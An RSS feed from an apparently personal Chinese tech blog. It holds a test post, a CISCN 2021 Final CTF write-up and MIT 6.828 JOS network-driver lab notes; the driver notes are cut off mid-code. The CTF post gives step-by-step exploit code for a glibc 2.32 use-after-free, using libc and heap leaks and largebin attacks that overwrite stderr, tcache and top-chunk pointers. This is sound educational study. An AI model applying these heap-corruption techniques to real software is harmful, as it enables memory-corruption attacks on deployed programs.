<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>C7</title>
    <link>https://billyotry.github.io/</link>
    
    <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>雖不能至 心嚮往之</description>
    <pubDate>Sun, 28 Feb 2021 13:21:57 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>这是标题</title>
      <link>https://billyotry.github.io/2099/01/01/test/</link>
      <guid>https://billyotry.github.io/2099/01/01/test/</guid>
      <pubDate>Wed, 31 Dec 2098 16:00:00 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;&lt;strong&gt;just a test&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://inews.gtimg.com/newsapp_ls/0/13071917630/0&quot; alt=&quot;backgroud&quot;&gt;&lt;/p&gt;

        
      
      </description>
      
      
      <content:encoded><![CDATA[<p><strong>just a test</strong></p><p> <img src="https://inews.gtimg.com/newsapp_ls/0/13071917630/0" alt="backgroud"></p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2099/01/01/test/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【CISCN2021Final】Binary_Cheater</title>
      <link>https://billyotry.github.io/2021/11/02/%E3%80%90CISCN2021Final%E3%80%91Binary_Cheater/</link>
      <guid>https://billyotry.github.io/2021/11/02/%E3%80%90CISCN2021Final%E3%80%91Binary_Cheater/</guid>
      <pubDate>Tue, 02 Nov 2021 09:31:13 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;来复现下肥猫出的题目&lt;/p&gt;
&lt;p&gt;至于漏洞点我就不贴了，就是个2.32下的uaf，然后开了沙盒，然后限制在了largebin，这里我就直接调它的exp了。&lt;/p&gt;
&lt;p&gt;因为开了混淆，所以我没怎么看反汇编，这里知道的是使用calloc函数。&lt;/p&gt;
&lt;p&gt;首先申请了四个堆
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>来复现下肥猫出的题目</p><p>至于漏洞点我就不贴了，就是个2.32下的uaf，然后开了沙盒，然后限制在了largebin，这里我就直接调它的exp了。</p><p>因为开了混淆，所以我没怎么看反汇编，这里知道的是使用calloc函数。</p><p>首先申请了四个堆块</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x410</span>,<span class="string">&#x27;c7&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x450</span>,<span class="string">&#x27;c8&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x420</span>,<span class="string">&#x27;c9&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x450</span>,<span class="string">&#x27;ca&#x27;</span>)<span class="comment">#3</span></span><br></pre></td></tr></table></figure><p><img src="https://inews.gtimg.com/newsapp_ls/0/14133313714/0" alt="image-20211102175311333"></p><p>然后释放两个堆块</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><img src="https://inews.gtimg.com/newsapp_ls/0/14134055696/0" alt="image-20211102212709115"></p><p>这里就是很传统的放两个chunk进unsortedbin中，然后申请一个大的chunk之后就能把这两个chunk放到largebin中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x450</span>,<span class="string">&#x27;ca&#x27;</span>)<span class="comment">#4</span></span><br></pre></td></tr></table></figure><p><img src="https://inews.gtimg.com/newsapp_ls/0/14134061173/0" alt="image-20211102212916513"></p><p>可以看到上面的图，申请了大的chunk之后确实把两个chunk放入到了largebin中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1e3ff0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base= &quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x2b0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base= &quot;</span>+<span class="built_in">hex</span>(heap_base)</span><br></pre></td></tr></table></figure><p>然后因为存在uaf，就可以理所当然的把libc基址和heap基址都泄露出来。这里有个值得注意的点，就是高版本，我也不知道到底是从哪个版本开始的，就是放入到unsorted bin中的地址，也就是main_arena+96的地方，低位变成了00，所以会存在截断的问题，这里放入到了largebin后，泄露的就不是main_arena+96了，所以就不用担心截断的问题。</p><p>然后再把这两个chunk申请回来，然后释放</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x410</span>,<span class="string">&#x27;ca&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x420</span>,<span class="string">&#x27;cb&#x27;</span>)<span class="comment">#6</span></span><br><span class="line">free(<span class="number">6</span>)</span><br></pre></td></tr></table></figure><p>那么此时的一个状态就是如下</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/14134107438/0" alt="image-20211102214658385"></p><p>在unsortedbin中存在一个chunk，然后我们申请一个比他大的chunk，把他放到largebin中，然后呢，我们继续释放一个chunk进入到unsortedbin中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x450</span>,<span class="string">&#x27;ca&#x27;</span>)<span class="comment">#7</span></span><br><span class="line">free(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p><img src="https://inews.gtimg.com/newsapp_ls/0/14134115754/0" alt="image-20211102215016455"></p><p>那么此时就是一个标准的largebin attack的一个状态，在largebin中存在一个chunk，然后呢unsorted bin中也存在一个chunk，还要注意下他的大小关系，就是unsorted bin中的chunk比largebin中的小，别问为什么，忘记了。此时我们只需要修改largebin中的那个chunk的bk_nextsize域后申请chunk就能够达成攻击。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stderr = libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;stderr= &quot;</span>+<span class="built_in">hex</span>(stderr)</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">edit(<span class="number">6</span>,p64(malloc_hook+<span class="number">1120</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0xb30</span>)+p64(stderr-<span class="number">0x20</span>))</span><br></pre></td></tr></table></figure><p>这里我们将largebin中的chunk，也就是0x55555555db30的chunk的bk_nextsize域改写成了stderr-0x20的地方，这样就可以在stderr的地方写上一个堆地址，这个地址是什么呢，就是放入到largebin中的chunk的地址，即0x55555555d2b0。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x450</span>,<span class="string">&#x27;c7&#x27;</span>)<span class="comment">#8</span></span><br></pre></td></tr></table></figure><p><img src="C:%5CUsers%5Cqin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211102215642196.png" alt="image-20211102215642196"></p><p>可以看到攻击达成后，我们的stderr被修改成了堆地址。</p><p>可以看下我们原来的stderr</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/14134139345/0" alt="image-20211102215919352"></p><p>然后是我们伪造的</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/14134140531/0" alt="image-20211102215950649"></p><p>然后就是重复刚才的操作，刚刚从unsortedbin放入到largebin的chunk，申请回来后又释放，这次攻击tcache指针，怎么找这个指针呢，直接search heapbase+0x10的地方就行了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x410</span>,<span class="string">&#x27;ca&#x27;</span>)<span class="comment">#9</span></span><br><span class="line">tcache = libc_base + <span class="number">0x1eb578</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;tcache= &quot;</span>+<span class="built_in">hex</span>(tcache)</span><br><span class="line">edit(<span class="number">6</span>,p64(malloc_hook+<span class="number">1120</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0xb30</span>)+p64(tcache-<span class="number">0x20</span>))</span><br><span class="line">free(<span class="number">9</span>)</span><br></pre></td></tr></table></figure><p><img src="https://inews.gtimg.com/newsapp_ls/0/14134158892/0" alt="image-20211102220550006"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x450</span>,<span class="string">&#x27;cb&#x27;</span>)<span class="comment">#10</span></span><br></pre></td></tr></table></figure><p><img src="https://inews.gtimg.com/newsapp_ls/0/14134160857/0" alt="image-20211102220617278"></p><p>可以看到tcache指针的内容也被我们修改成了我们可控的堆块地址。</p><p>继续重复操作，这次我们攻击top chunk</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x410</span>,<span class="string">&#x27;cc&#x27;</span>)<span class="comment">#11</span></span><br><span class="line">top_chunk = malloc_hook + <span class="number">0x70</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;top_chunk= &quot;</span>+<span class="built_in">hex</span>(top_chunk)</span><br><span class="line">edit(<span class="number">6</span>,p64(malloc_hook+<span class="number">1120</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0xb30</span>)+p64(top_chunk-<span class="number">0x20</span>))</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>我们知道我们在main_arena+96存放着top_chunk的指针</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/14136410529/0" alt="image-20211103171545126"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x450</span>,<span class="string">&#x27;ca&#x27;</span>)<span class="comment">#12</span></span><br></pre></td></tr></table></figure><p>攻击成功后，可以看到top chunk的指针被我们修改成了可控的堆块地址。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/14136413251/0" alt="image-20211103171623052"></p><p>到这里，我们的stderr、tcache指针、top chunk指针都被修改成了同一个可控的chunk。</p><p>攻击完成后，我们看下结构</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/14140915963/0" alt="image-20211104221345762"></p><p>接下来就是修改我们可控的那个chunk的内容。</p><p>调用链：</p><p>calloc -&gt; _int_malloc -&gt; sysmalloc -&gt; _malloc_assert -&gt; __fxprintf -&gt; locked_vfxprintf -&gt; _vfprintf_internal -&gt; _IO_str_overflow</p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/11/02/%E3%80%90CISCN2021Final%E3%80%91Binary_Cheater/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT 6.828】JOS学习笔记 Lab6</title>
      <link>https://billyotry.github.io/2021/09/01/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab6/</link>
      <guid>https://billyotry.github.io/2021/09/01/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab6/</guid>
      <pubDate>Wed, 01 Sep 2021 13:09:40 GMT</pubDate>
      <description>
      
        
        
          &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;本lab是6.828默认的最后一个实验，围绕&lt;strong&gt;网络&lt;/strong&gt;展开。主要就做一件事&lt;/p&gt;
&lt;p&gt;从0实现网络驱动。&lt;/
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>本lab是6.828默认的最后一个实验，围绕<strong>网络</strong>展开。主要就做一件事</p><p>从0实现网络驱动。</p><p>还提到一些比较重要的概念：</p><ol><li>内存映射I/O</li><li>DMA</li><li>用户级线程实现原理</li></ol><h1 id="The-Network-Server"><a href="#The-Network-Server" class="headerlink" title="The Network Server"></a>The Network Server</h1><p>从0开始写协议栈是十分困难的，我们将使用IwIP，这是一种轻量级TCP/IP的实现，更多的IwIP信息可以参考<a href="https://savannah.nongnu.org/projects/lwip/">lwIP官网</a>。对于我们来说IwIP就像是实现了BSD socket接口的黑盒，分别有一个包输入和包输出端口。</p><p>JOS网络服务由四个进程组成：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13941764934/0" alt="image-20210901212107460"></p><ol><li><p>核心网络进程：</p><p>核心网络进程由socket调用分发器和IwIP组成。socket调用分发器和文件服务一样。用户进程发送IPC消息给核心网络进程。</p><p>用户进程不直接使用nsipc_*开头的函数调用，而是使用lib/socket.c中的函数。这样用户进程通过文件描述符来访问socket。</p><p>文件服务和网络服务有很多相似的地方，但是最大的不同点在于，BSD socket调用accept和recv可能会阻塞，如果分发调用IwIP这些阻塞的函数，自己也会阻塞，这样就只能提供一个网络服务了。显然是不能接受的，网络服务将使用用户级的线程来避免这种情况。</p></li><li><p>包输出进程：</p><p>IwIP通过IPC发送packets到输出进程，然后输出进程负责通过系统调用将这些packets转发给设备驱动。</p></li><li><p>包输入进程：</p><p>对于每个从设备驱动受到的packets，输入进程从内核取出这些packet，然后使用IPC转发给核心网络进程。</p></li><li><p>定时器进程：</p><p>定时器进程周期性地发消息给核心网络进程，通知它一段时间已经过了，这些消息被IwIP用来是实现网络超时。</p></li></ol><p>仔细看上图，绿颜色的部分是本lab需要实现的部分。分别是：</p><ol><li>E1000网卡驱动，并对外提供两个系统调用，分别用来接受和发送数据。</li><li>输入进程</li><li>输出进程</li><li>用户程序httpd的一部分</li></ol><h1 id="Part-A-Initialization-and-transmitting-packets"><a href="#Part-A-Initialization-and-transmitting-packets" class="headerlink" title="Part A: Initialization and transmitting packets"></a>Part A: Initialization and transmitting packets</h1><p>内核目前还没有时间的概念，硬件每隔10ms都会发送一个时钟中断。每次时钟中断，我们可以给某个变量加一，来表明时间过去了10ms，具体实现在kern/time.c中</p><p><strong>exercise1</strong></p><p>在kern/trap.c中添加对time_tick的调用。实现sys_time_mesc()系统调用。sys_time_msec()配合sys_yield()实现sleep()(见user/testtime.c)。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;kern&#x2F;trap.c</span><br><span class="line">if (tf-&gt;tf_trapno &#x3D;&#x3D; IRQ_OFFSET + IRQ_TIMER) &#123;</span><br><span class="line">lapic_eoi();</span><br><span class="line">time_tick();</span><br><span class="line">sched_yield();</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;kern&#x2F;syscall.c</span><br><span class="line">static int</span><br><span class="line">sys_time_msec(void)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F; LAB 6: Your code here.</span><br><span class="line">&#x2F;&#x2F;panic(&quot;sys_time_msec not implemented&quot;);</span><br><span class="line">return time_msec();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case (SYS_time_msec):</span><br><span class="line">return sys_time_msec();</span><br></pre></td></tr></table></figure><h2 id="The-Network-Interface-Card"><a href="#The-Network-Interface-Card" class="headerlink" title="The Network Interface Card"></a>The Network Interface Card</h2><p>编写驱动我们需要很深的硬件以及硬件接口知识，本lab会提供一些E1000比较底层的知识，我们需要学会看<a href="https://pdos.csail.mit.edu/6.828/2018/readings/hardware/8254x_GBe_SDM.pdf">E1000的开发者手册</a>。</p><h3 id="PCI-Interface"><a href="#PCI-Interface" class="headerlink" title="PCI Interface"></a>PCI Interface</h3><blockquote><p>PCI是外围设备互联(Peripheral Component Interconnect)的简称，是在目前计算机系统中得到广泛应用的通用总线接口标准：</p><ul><li>在一个PCI系统中，最多可以有256根总线，一般主机上只会用到其中很少的几条</li><li>在一根PCI总线上可以连接多个物理设备，可以是一个网卡、显卡或者声卡等，最多不超过32个</li><li>一个PCI物理设备可以有多个功能，比如同时提供视频解析和声音解析，最多可提供8个功能</li><li>每个功能对于一个256字节的PCI配置空间</li></ul></blockquote><p>E1000是PCI设备，意味着E1000将插到主板上的PCI总线上。PCI总线有地址，数据，中断线允许CPU和PCI设备进行交互。PCI设备在被使用前需要被发现和初始化。发现的过程是遍历PCI总线寻找相应的设备。初始化的过程是分配I/O和内存空间，包括协商IRQ线。</p><p>我们已经在kern/pic.c提供了PCI代码。为了在启动阶段初始化PCI，PCI代码遍历PCI总线寻找设备，当它找到一个设备，便会读取该设备的厂商ID和设备ID，然后使用这两个值作为键搜索pci_attach_vendor数组，该数组由struct pci_driver结构组成。struct pci_driver结构如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pci_driver</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> key1, key2;</span><br><span class="line">    <span class="keyword">int</span> (*attachfn) (struct pci_func *pcif);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果找到一个struct pci_driver结构，PCI代码将会执行struct pci_driver结构的attachfn函数指针指向的函数执行初始化。attachfn函数指针指向的函数传入一个struct pci_func结构指针。struct pci_func结构的结构如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pci_func</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pci_bus</span> *<span class="title">bus</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> dev;</span><br><span class="line">    <span class="keyword">uint32_t</span> func;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> dev_id;</span><br><span class="line">    <span class="keyword">uint32_t</span> dev_class;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> reg_base[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> reg_size[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> irq_line;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中reg_base数组保存了内存映射I/O的基地址，reg_size保存了以字节为单位的大小。irq_line包含了IRQ线。当attachfn函数指针指向的函数执行后，该设备就算被找到了，但还没有启用，attachfn函数指针指向的函数应该调用pci_func_enable()，该函数启动设备，协商资源，并且填入传入的struct pci_func结构。</p><p><strong>exercise3</strong></p><p>实现attach函数来初始化E1000。在kern/pci.c的pci_attach_vendor数组中添加一个元素。82540EM的厂商ID和设备ID可以在手册5.2节找到。实验已经提供了kern/e1000.c和kern/e1000.h，补充这两个文件完成实验。添加一个函数，并将该函数地址添加到pci_attach_vendor这个数组中。</p><p>根据手册和内核的启动信息我们能够找到E1000 的 Vender ID = 0x8086， Device ID = 0x100E。</p><p>那么我们修改我们的e1000.h文件：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> JOS_KERN_E1000_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JOS_KERN_E1000_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;kern/pci.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> E1000_VENDER_ID_82540EM 0x8086</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> E1000_DEV_ID_82540EM 0X100E</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">e1000_attachfn</span><span class="params">(struct pci_func *pcif)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">// SOL &gt;= 6</span></span></span><br></pre></td></tr></table></figure><p>然后是e1000.c文件加上初始化函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;kern/e1000.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;kern/pmap.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 6: Your driver code here</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">e1000_attachfn(struct pci_func *pcif)</span><br><span class="line">&#123;</span><br><span class="line">    pci_func_enable(pcif);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在kern/pci.c的pci_attach_vendor数组中添加一个元素：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pci_driver</span> <span class="title">pci_attach_vendor</span>[] =</span> &#123;</span><br><span class="line">&#123; E1000_VENDER_ID_82540EM, E1000_DEV_ID_82540EM, &amp;e1000_attachfn&#125;,</span><br><span class="line">&#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="Memory-mapped-I-O"><a href="#Memory-mapped-I-O" class="headerlink" title="Memory-mapped I/O"></a>Memory-mapped I/O</h2><p>程序通过内存映射I/O(MMIO)和E1000交互。通过MMIO这种方式，允许通过读写”memory”进行控制设备，这里的”memory”并非DRAM，而是直接读写设备。pci_func_enable()协商MMIO范围，并将基地址和大小保存在基地址寄存器0(reg_base[0] and reg_size[0])中，这是一个物理地址范围，我们需要通过虚拟地址来访问，所以需要创建一个新的内核内存映射。</p><p><strong>exercise4</strong></p><p>我们在table 13.2中能查到状态寄存器的offset。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13943318640/0" alt="image-20210902140414667"></p><p>使用mmio_map_region()建立内存映射。至此我们能通过虚拟地址bar_va来访问E1000的寄存器。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;kern/e1000.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;kern/pmap.h&gt;</span></span></span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">void</span> *bar_va; </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> E1000REG(offset) (void *)(bar_va + offset)</span></span><br><span class="line"><span class="comment">// LAB 6: Your driver code here</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">e1000_attachfn(struct pci_func *pcif)</span><br><span class="line">&#123;</span><br><span class="line">    pci_func_enable(pcif);</span><br><span class="line">    <span class="comment">//该函数从线性地址MMIOBASE开始映射物理地址pa开始的size大小的内存，并返回pa对应的线性地址。</span></span><br><span class="line">    bar_va = mmio_map_region(pcif-&gt;reg_base[<span class="number">0</span>],pcif-&gt;reg_size[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">uint32_t</span> *status_reg = (<span class="keyword">uint32_t</span> *)E1000REG(E1000_STATUS);</span><br><span class="line">    assert(*status_reg == <span class="number">0x80080783</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>lab3和lab4的结果是，我们可以通过直接访问bar_va开始的内存区域来设置E1000的特性和工作方式。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13943335153/0" alt="image-20210902141026050"></p><h3 id="DMA"><a href="#DMA" class="headerlink" title="DMA"></a>DMA</h3><p>DMA是什么？简单的说就是允许外部设备直接访问内存，而不需要CPU的参与。</p><p>我们可以通过读写E1000的寄存器来发送和接受数据包，但是这种方式非常慢。E1000使用DMA直接读写内存，不需要CPU参与。驱动负责分配内存作为发送和接受队列，设置DMA描述符，配置E1000这些队列的设置，之后的操作都是异步的。</p><p>发送一个数据包：驱动将该数据包拷贝到发送队列中的一个DMA描述符中，通知E1000，E1000从发送队列的DMA描述符中拿到数据发送出去。</p><p>接受数据包：E1000将数据拷贝到接受队列的一个DMA描述符中，驱动可以从该DMA描述符中读取数据包。</p><p>发送和接受队列非常相似，都由DMA描述符组成，DMA描述符的确切结构不是固定的，但是都包含一些标志和包数据的物理地址。发送和接受队列可以由环形数组实现，都有一个头指针和尾指针。</p><p>这些数组的指针和描述符中的包缓冲地址都应该是物理地址，因为硬件操作DMA读写物理内存不需要通过MMU。</p><h2 id="Transmitting-Packets"><a href="#Transmitting-Packets" class="headerlink" title="Transmitting Packets"></a>Transmitting Packets</h2><p>首先我们需要初始化E1000来支持发送包。第一步是建立发送队列，队列的具体结构在3.4节，描述符的结构在3.3.3节。驱动必须为发送描述符数组和数据缓冲区域分配内存。有多种方式分配数据缓冲区。最简单的是在驱动初始化的时候就为每一个描述符分配一个对应的数据缓冲区。最大的包是1518字节。</p><p>发送队列和发送队列描述符如下：</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab6/lab6_3_send_queue.png" alt="发送队列"></p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab6/lab6_4_send_discripter.png" alt="发送队列描述符"></p><p><strong>exercise5</strong></p><p>按照14.5节的描述来初始化。步骤如下</p><ol><li>分配一块内存用作发送描述符队列，起始地址要16字节对齐。用基地址(TDBAL/TDBAH)寄存器。</li><li>设置(TDLEN)寄存器，该寄存器保存发送描述符队列长度，必须128字节对齐。</li><li>设置(TDH/TDT)寄存器，这两个寄存器都是发送描述符队列的下标。分别指向头部和尾部。应该初始化为0。</li><li>初始化TCTL寄存器。设置TCTL.EN位为1，设置TCTL.PSP位为1。设置TCTL.CT为10h。设置TCTL.COLD为40H</li><li>设置TIPG寄存器</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;kern/e1000.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;kern/pmap.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 6: Your driver code here</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">void</span> *bar_va; </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">e1000_tdh</span> *<span class="title">tdh</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">e1000_tdt</span> *<span class="title">tdt</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">e1000_tdlen</span> *<span class="title">tdlen</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">e1000_tx_desc</span> <span class="title">tx_desc_array</span>[<span class="title">TXDESCS</span>];</span></span><br><span class="line"><span class="keyword">char</span> tx_buffer_array[TXDESCS][TX_PKT_SIZE];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> E1000REG(offset) (void *)(bar_va + offset)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">e1000_attachfn(struct pci_func *pcif)</span><br><span class="line">&#123;</span><br><span class="line">    pci_func_enable(pcif);</span><br><span class="line">    <span class="comment">//该函数从线性地址MMIOBASE开始映射物理地址pa开始的size大小的内存，并返回pa对应的线性地址。</span></span><br><span class="line">    cprintf(<span class="string">&quot;reg_base:%x, reg_size:%x\n&quot;</span>, pcif-&gt;reg_base[<span class="number">0</span>], pcif-&gt;reg_size[<span class="number">0</span>]);</span><br><span class="line">    bar_va = mmio_map_region(pcif-&gt;reg_base[<span class="number">0</span>],pcif-&gt;reg_size[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">uint32_t</span> *status_reg = (<span class="keyword">uint32_t</span> *)E1000REG(E1000_STATUS);</span><br><span class="line">    assert(*status_reg == <span class="number">0x80080783</span>);</span><br><span class="line">    e1000_transmit_init();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">e1000_transmit_init()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; TXDESCS;i++)&#123;</span><br><span class="line">        tx_desc_array[i].addr = PADDR(tx_buffer_array[i]);</span><br><span class="line">        tx_desc_array[i].cmd = <span class="number">0</span>;</span><br><span class="line">        tx_desc_array[i].status |= E1000_TXD_STAT_DD;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置队列长度寄存器</span></span><br><span class="line">    tdlen = (struct e1000_tdlen *)E1000REG(E1000_TDLEN);</span><br><span class="line">    tdlen-&gt;len = TXDESCS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置队列基址低32位</span></span><br><span class="line">    <span class="keyword">uint32_t</span> *tdbal = (<span class="keyword">uint32_t</span> *)E1000REG(E1000_TDBAL);</span><br><span class="line">    *tdbal = PADDR(tx_desc_array);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置队列基址高32位</span></span><br><span class="line">    <span class="keyword">uint32_t</span> *tdbah = (<span class="keyword">uint32_t</span> *)E1000REG(E1000_TDBAH);</span><br><span class="line">    *tdbah = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置头指针寄存器</span></span><br><span class="line">    tdh = (struct e1000_tdh *)E1000REG(E1000_TDH);</span><br><span class="line">    tdh-&gt;tdh = <span class="number">0</span>;</span><br><span 